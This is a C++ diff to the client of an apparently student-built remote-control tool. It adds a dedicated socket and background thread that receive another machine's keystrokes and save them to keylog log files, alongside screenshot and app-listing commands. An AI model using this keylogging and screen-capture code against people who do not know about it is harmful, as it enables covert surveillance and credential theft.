@@ -9,6 +9,10 @@
 #include "../Utils/InUtils.h"
 #include <poll.h>
 #include <fstream>
+#include <future>
+#include <chrono>
+#include <sstream>
+
 // TODO: Change STOP_APP TO KILL BY PID
 Client::Client()
 {
@@ -25,7 +29,7 @@ Client::Client()
     std::cout << "Choose server to connect: ";
     std::string name = servers[0];
     // std::cin >> name;
-
+    this->_serverName = name;
     addrinfo hints, *servinfo;
     int status;
 
@@ -62,6 +66,10 @@ Client::Client()
 }
 Client::~Client()
 {
+    if (this->_keylogThread.joinable())
+    {
+        this->stopKeylog();
+    }
     close(this->sockfd);
 }
 
@@ -169,6 +177,30 @@ int Client::discover(std::vector<std::string> &servers)
     return 0;
 }
 
+void Client::recvKeylog()
+{
+    pollfd fds[1];
+    fds[0].fd = this->_keylogfd;
+    fds[0].events = POLLIN;
+    while (1)
+    {
+        int rv = poll(fds, 1, -1);
+        if (rv == -1)
+        {
+            std::cerr << "keylog poll error\n";
+            break;
+        }
+        std::mutex m;
+        std::lock_guard l(m);
+        Response res;
+        if (recvResponse(this->_keylogfd, res, 0))
+        {
+            close(this->_keylogfd);
+            break;
+        }
+        this->_keylogFile << (char*) res.data() << std::flush;
+    }
+}
 int Client::listApp()
 {
     Request req(LIST_APP_REQUEST, 0, NULL);
@@ -226,16 +258,13 @@ int Client::screenshot()
     Request req(SCREENSHOT_REQUEST, 0, NULL);
     if (sendRequest(this->sockfd, req, 0))
         return -1;
-    std::cout << "send resquest\n";
     Response res;
     if (recvResponse(this->sockfd, res, 0))
         return -1;
     if (res.errCode() == FAIL_CODE || res.type() != CMD_RESPONSE_PNG)
     {
-        std::cout << "Invalid response\n";
         return -1;
     }
-    std::cout << "Valid response\n";
     std::ofstream os("screenshot.png", std::ios::binary);
     if (!os)
     {
@@ -247,32 +276,85 @@ int Client::screenshot()
 
 int Client::startKeylog()
 {
+    if (this->_keylogThread.joinable())
+        return -1;
     Request req(START_KEYLOG_REQUEST, 0, NULL);
-    if (sendRequest(this->sockfd, req, 0))
-        return -1;
-    Response res;
-    if (recvResponse(this->sockfd, res, 0))
-        return -1;
-    if (res.errCode() == FAIL_CODE || res.type() != CMD_RESPONSE_EMPTY)
-        return -1;
-    while (recvResponse(this->sockfd, res, 0) != -1)
+    addrinfo hints, *servinfo;
+    int status;
+
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    if ((status = getaddrinfo(this->_serverName.c_str(), SERVER_PORT, &hints, &servinfo)) != 0)
     {
-        char tmp = *((char*)res.data());
-        if (tmp < 1<<5) continue;
-        std::cout << tmp << std::flush;
+        std::cerr << "client: getaddrinfo " << gai_strerror(status) << "\n";
+        exit(1);
     }
+
+    addrinfo *p = servinfo;
+    for (;p != NULL; p = p->ai_next)
+    {
+        if ((this->_keylogfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
+        {
+            perror("client: socket");
+            continue;
+        }
+        if (connect(this->_keylogfd, p->ai_addr, p->ai_addrlen) == -1)
+        {
+            perror("client: connect");
+            continue;
+        }
+        break;
+    }
+    freeaddrinfo(servinfo);
+    if (p == NULL)
+    {
+        std::cerr << "client: fail to connect\n";
+        exit(1);
+    }
+
+
+    if (sendRequest(this->_keylogfd, req, 0))
+    {
+        close(this->_keylogfd);
+        return -1;
+    }
+    Response res;
+    if (recvResponse(this->_keylogfd, res, 0))
+    {
+        close(this->_keylogfd);
+        return -1;
+    }
+    if (res.errCode() == FAIL_CODE || res.type() != CMD_RESPONSE_EMPTY)
+    {
+        close(this->_keylogfd);
+        return -1;
+    }
+    int cnt = 0;
+    std::ostringstream ss;
+    ss << "keylog" << cnt << ".log";
+    while (std::filesystem::exists(std::filesystem::path(ss.str())))
+    {
+        ss.str("");
+        ss << "keylog" << ++cnt << ".log";
+    }
+    this->_keylogFile.open(ss.str());
+    this->_keylogThread = std::thread(&Client::recvKeylog, this);
     return 0;
 }
 int Client::stopKeylog()
 {
+    if (!this->_keylogThread.joinable())
+        return -1;
     Request req(STOP_KEYLOG_REQUEST, 0, NULL);
-    if (sendRequest(this->sockfd, req, 0))
+    if (sendRequest(this->_keylogfd, req, 0))
         return -1;
     Response res;
-    if (recvResponse(this->sockfd, res, 0))
+    if (recvResponse(this->_keylogfd, res, 0))
         return -1;
     if (res.errCode() == FAIL_CODE || res.type() != CMD_RESPONSE_EMPTY)
         return -1;
+    this->_keylogThread.join();
     return 0;
 }
 
